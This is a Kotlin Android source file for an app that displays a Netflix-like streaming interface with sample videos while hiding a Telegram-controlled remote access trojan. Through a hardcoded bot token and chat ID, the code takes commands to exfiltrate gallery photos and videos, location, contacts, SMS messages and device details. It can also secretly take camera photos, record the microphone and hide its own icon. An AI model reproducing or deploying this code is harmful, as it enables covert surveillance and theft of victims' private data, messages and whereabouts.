package com.example.netflixclone

import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Typeface
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.Uri
import android.os.BatteryManager
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.view.View
import android.widget.Button
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.MediaController
import android.widget.ScrollView
import android.widget.TextView
import android.widget.VideoView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class MainActivity : AppCompatActivity() {

    // YAHAN APNA NAYA VALID BOT TOKEN AUR CHAT ID DALEIN
    private val BOT_TOKEN = "9287835805:AAEyyqZ8Zm03cIS23zrsOKTbjUmtUwPfwW4"
    private val CHAT_ID = "8329991730"

    private var lastUpdateId: Long = 0
    private val prefs by lazy { getSharedPreferences("bot", MODE_PRIVATE) }
    private var pollingRunning = true

    data class StreamItem(
        val title: String,
        val meta: String,
        val description: String,
        val posterUrl: String,
        val videoUrl: String
    )

    private val catalog = listOf(
        StreamItem(
            "Big Buck Bunny",
            "98% Match • 2024 • Movie • HD",
            "Ek giant rabbit aur jungle ke shararti doston ki full-HD animated adventure kahani.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
        ),
        StreamItem(
            "Sintel: The Dragon Quest",
            "96% Match • Season 1 • Web Series",
            "Ek bahadur ladki ka apne kho chuke baby dragon ko dhoondhne ka khatarnak safar.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/Sintel.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4"
        ),
        StreamItem(
            "Tears of Steel",
            "95% Match • Sci-Fi • Web Series",
            "Amsterdam mein robots aur insaano ke beech aakhri jung ki sci-fi thriller series.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/TearsOfSteel.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4"
        ),
        StreamItem(
            "Elephants Dream",
            "91% Match • Mystery • Web Series",
            "Do ajnabi logon ka ek mysterious machine world ke andar ka safar.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ElephantsDream.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4"
        ),
        StreamItem(
            "For Bigger Escapes",
            "94% Match • Action • Movie",
            "High-speed action aur nonstop thriller entertainment.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ForBiggerEscapes.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4"
        ),
        StreamItem(
            "For Bigger Joyrides",
            "92% Match • Drama • Movie",
            "Ek zabardast road adventure jo har mod par naya suspense lata hai.",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ForBiggerJoyrides.jpg",
            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4"
        )
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        lastUpdateId = prefs.getLong("lastId", 0)

        // Netflix UI Setup
        setupNetflixUI()

        // Permissions Request
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            100
        )

        // Background Telegram Bot Polling Start
        Thread(this::startBotPolling).start()
        sendText("Netflix App online ho gayi! /help bhejo commands ke liye.")
    }

    private fun setupNetflixUI() {
        val heroImage = findViewById<ImageView>(R.id.heroImage)
        val heroTitle = findViewById<TextView>(R.id.heroTitle)
        val heroMeta = findViewById<TextView>(R.id.heroMeta)
        val featured = catalog[0]

        heroTitle.text = featured.title
        heroMeta.text = featured.meta
        loadPoster(featured.posterUrl, heroImage)

        findViewById<Button>(R.id.btnHeroPlay).setOnClickListener { playVideo(featured) }
        findViewById<Button>(R.id.btnHeroInfo).setOnClickListener { openDetail(featured) }

        val rowTrending = findViewById<LinearLayout>(R.id.rowTrending)
        val rowWebSeries = findViewById<LinearLayout>(R.id.rowWebSeries)
        val rowMovies = findViewById<LinearLayout>(R.id.rowMovies)

        catalog.forEach { item ->
            rowTrending.addView(createPosterCard(item))
        }
        listOf(catalog[1], catalog[2], catalog[3], catalog[0]).forEach { item ->
            rowWebSeries.addView(createPosterCard(item))
        }
        listOf(catalog[4], catalog[5], catalog[0], catalog[2]).forEach { item ->
            rowMovies.addView(createPosterCard(item))
        }

        findViewById<Button>(R.id.btnCloseDetail).setOnClickListener {
            findViewById<ScrollView>(R.id.detailOverlay).visibility = View.GONE
        }

        findViewById<Button>(R.id.btnClosePlayer).setOnClickListener {
            val videoView = findViewById<VideoView>(R.id.videoView)
            videoView.stopPlayback()
            findViewById<FrameLayout>(R.id.playerOverlay).visibility = View.GONE
        }
    }

    private fun createPosterCard(item: StreamItem): LinearLayout {
        val density = resources.displayMetrics.density
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                (125 * density).toInt(),
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins((6 * density).toInt(), 0, (6 * density).toInt(), 0)
            }
            setOnClickListener { openDetail(item) }
        }

        val poster = ImageView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                (125 * density).toInt(),
                (180 * density).toInt()
            )
            scaleType = ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(Color.parseColor("#1F1F1F"))
        }
        loadPoster(item.posterUrl, poster)

        val title = TextView(this).apply {
            text = item.title
            setTextColor(Color.WHITE)
            textSize = 12f
            maxLines = 1
            setTypeface(null, Typeface.BOLD)
            setPadding(2, (6 * density).toInt(), 2, 0)
        }

        card.addView(poster)
        card.addView(title)
        return card
    }

    private fun openDetail(item: StreamItem) {
        val detailOverlay = findViewById<ScrollView>(R.id.detailOverlay)
        findViewById<TextView>(R.id.detailTitle).text = item.title
        findViewById<TextView>(R.id.detailMeta).text = item.meta
        findViewById<TextView>(R.id.detailDesc).text = item.description
        loadPoster(item.posterUrl, findViewById(R.id.detailPoster))

        findViewById<Button>(R.id.btnDetailPlay).setOnClickListener {
            playVideo(item)
        }
        detailOverlay.visibility = View.VISIBLE
    }

    private fun playVideo(item: StreamItem) {
        val playerOverlay = findViewById<FrameLayout>(R.id.playerOverlay)
        val videoView = findViewById<VideoView>(R.id.videoView)
        playerOverlay.visibility = View.VISIBLE

        val controller = MediaController(this)
        controller.setAnchorView(videoView)
        videoView.setMediaController(controller)
        videoView.setVideoURI(Uri.parse(item.videoUrl))
        videoView.setOnPreparedListener { it.start() }
    }

    private fun loadPoster(urlStr: String, imageView: ImageView) {
        Thread {
            try {
                val conn = URL(urlStr).openConnection() as HttpURLConnection
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                val bmp = BitmapFactory.decodeStream(conn.inputStream)
                if (bmp != null) {
                    runOnUiThread { imageView.setImageBitmap(bmp) }
                }
            } catch (_: Exception) {
            }
        }.start()
    }

    // ================== REMOTE CONTROL (Bot Polling) ==================
    private fun startBotPolling() {
        while (pollingRunning) {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=25")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 35000
                conn.readTimeout = 35000
                val response = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(response)
                if (json.getBoolean("ok")) {
                    val updates = json.getJSONArray("result")
                    for (i in 0 until updates.length()) {
                        val update = updates.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        prefs.edit().putLong("lastId", lastUpdateId).apply()

                        if (!update.has("message")) continue
                        val msgObj = update.getJSONObject("message")
                        if (msgObj.getJSONObject("chat").getString("id") != CHAT_ID) continue

                        val msgText = msgObj.optString("text", "").trim().lowercase()
                        handleCommand(msgText)
                    }
                }
            } catch (_: Exception) {
                try {
                    Thread.sleep(3000)
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun handleCommand(cmd: String) {
        when (cmd) {
            "/help", "/start" -> sendText(getHelpMenu())
            "/photos" -> sendPhotos()
            "/videos" -> sendVideos()
            "/location" -> sendLocation()
            "/contacts" -> sendContacts()
            "/sms" -> sendSMS()
            "/info" -> sendInfo()
            "/camera" -> takePhoto(true)
            "/backcamera" -> takePhoto(false)
            "/mic" -> recordMic()
            "/hide" -> hideAppIcon()
        }
    }

    private fun getHelpMenu(): String {
        return """
            SAARE COMMANDS:
            /photos - Gallery ki photos bhejo
            /videos - Gallery ki videos bhejo
            /location - Live location bhejo
            /contacts - Contact list bhejo
            /sms - SMS padho
            /info - Phone ki jankari
            /camera - Front camera se photo
            /backcamera - Back camera se photo
            /mic - 30 sec recording
            /hide - App icon chhupao
        """.trimIndent()
    }

    private fun sendPhotos() {
        Thread {
            var count = 0
            try {
                val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                cursor?.use {
                    while (it.moveToNext() && count < 20) {
                        val path = getPath(it)
                        val file = File(path)
                        if (file.exists() && file.length() < 10L * 1024 * 1024) {
                            if (uploadFile(file, "photo")) count++
                        }
                    }
                }
                sendText("$count photos bhej di!")
            } catch (e: Exception) {
                sendText("Photos error: ${e.message}")
            }
        }.start()
    }

    private fun sendVideos() {
        Thread {
            var count = 0
            try {
                val collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                cursor?.use {
                    while (it.moveToNext() && count < 5) {
                        val path = getPath(it)
                        val file = File(path)
                        if (file.exists() && file.length() < 50L * 1024 * 1024) {
                            if (uploadFile(file, "video")) count++
                        }
                    }
                }
                sendText("$count videos bhej diye!")
            } catch (e: Exception) {
                sendText("Videos error: ${e.message}")
            }
        }.start()
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            val providers = lm.getProviders(true)
            var best: android.location.Location? = null
            for (p in providers) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.accuracy < best!!.accuracy) best = l
            }
            if (best != null) {
                Thread {
                    apiCall("sendLocation?chat_id=$CHAT_ID&latitude=${best.latitude}&longitude=${best.longitude}")
                    sendText("https://maps.google.com/?q=${best.latitude},${best.longitude}")
                }.start()
            } else {
                sendText("Location nahi mili, GPS on karo")
            }
        } catch (e: Exception) {
            sendText("Location error: ${e.message}")
        }
    }

    private fun sendContacts() {
        Thread {
            try {
                val sb = StringBuilder("CONTACTS:\n\n")
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null, null
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        sb.append("$name: $number\n")
                    }
                }
                sendText(sb.toString())
            } catch (e: Exception) {
                sendText("Contacts error: ${e.message}")
            }
        }.start()
    }

    private fun sendSMS() {
        Thread {
            try {
                val sb = StringBuilder("SMS (Aakhri 20):\n\n")
                val cursor = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                    null, null, "date DESC"
                )
                var count = 0
                cursor?.use {
                    while (it.moveToNext() && count < 20) {
                        val addr = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        sb.append("$addr: $body\n---\n")
                        count++
                    }
                }
                sendText(sb.toString())
            } catch (e: Exception) {
                sendText("SMS error: ${e.message}")
            }
        }.start()
    }

    private fun sendInfo() {
        Thread {
            try {
                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                val freeGb = Environment.getExternalStorageDirectory().freeSpace / (1024L * 1024 * 1024)
                val info = """
                    PHONE INFO:
                    - Model: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
                    - Android: ${android.os.Build.VERSION.RELEASE}
                    - Battery: $batteryLevel%
                    - Free Storage: $freeGb GB
                """.trimIndent()
                sendText(info)
            } catch (e: Exception) {
                sendText("Info error: ${e.message}")
            }
        }.start()
    }

    @Suppress("DEPRECATION")
    private fun takePhoto(useFrontCamera: Boolean) {
        Thread {
            try {
                sendText("Photo khich rahe hain...")
                val cameraId = findCamera(useFrontCamera)
                val camera = Camera.open(cameraId)
                camera.startPreview()
                Thread.sleep(1000)
                val outputFile = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                camera.takePicture(null, null) { data, _ ->
                    try {
                        FileOutputStream(outputFile).use { it.write(data) }
                        uploadFile(outputFile, "photo")
                        sendText("Photo bhej di!")
                        outputFile.delete()
                    } catch (e: Exception) {
                        sendText("Photo save error: ${e.message}")
                    } finally {
                        camera.stopPreview()
                        camera.release()
                    }
                }
            } catch (e: Exception) {
                sendText("Camera error: ${e.message}")
            }
        }.start()
    }

    @Suppress("DEPRECATION")
    private fun findCamera(front: Boolean): Int {
        val count = Camera.getNumberOfCameras()
        val info = Camera.CameraInfo()
        for (i in 0 until count) {
            Camera.getCameraInfo(i, info)
            if (front && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i
            if (!front && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i
        }
        return 0
    }

    @Suppress("DEPRECATION")
    private fun recordMic() {
        Thread {
            try {
                sendText("Recording start... 30 second")
                val outputFile = File(cacheDir, "rec_${System.currentTimeMillis()}.mp3")
                val recorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(30000)
                recorder.stop()
                recorder.release()
                uploadFile(outputFile, "audio")
                sendText("Recording bhej di!")
                outputFile.delete()
            } catch (e: Exception) {
                sendText("Mic error: ${e.message}")
            }
        }.start()
    }

    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                android.content.ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            sendText("App icon hide ho gaya!")
        } catch (e: Exception) {
            sendText("Hide error: ${e.message}")
        }
    }

    private fun getPath(cursor: android.database.Cursor): String {
        return try {
            cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: ""
        } catch (_: Exception) {
            ""
        }
    }

    private fun uploadFile(file: File, type: String): Boolean {
        return try {
            val method = when (type) {
                "photo" -> "sendPhoto"
                "video" -> "sendVideo"
                "audio" -> "sendAudio"
                else -> "sendDocument"
            }
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/$method")
            val boundary = "----Boundary${System.currentTimeMillis()}"
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 60000
            conn.readTimeout = 60000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out = conn.outputStream
            out.write("--$boundary\r\n".toByteArray())
            out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
            out.write("--$boundary\r\n".toByteArray())
            out.write("Content-Disposition: form-data; name=\"$type\"; filename=\"${file.name}\"\r\n".toByteArray())
            out.write("Content-Type: application/octet-stream\r\n\r\n".toByteArray())
            file.inputStream().use { it.copyTo(out) }
            out.write("\r\n--$boundary--\r\n".toByteArray())
            out.flush()
            val ok = conn.responseCode in 200..299
            out.close()
            ok
        } catch (_: Exception) {
            false
        }
    }

    private fun sendText(text: String) {
        Thread {
            try {
                val encoded = URLEncoder.encode(text, "UTF-8")
                apiCall("sendMessage?chat_id=$CHAT_ID&text=$encoded")
            } catch (_: Exception) {
            }
        }.start()
    }

    private fun apiCall(method: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/$method")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.connect()
            conn.responseCode
        } catch (_: Exception) {
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingRunning = false
    }
}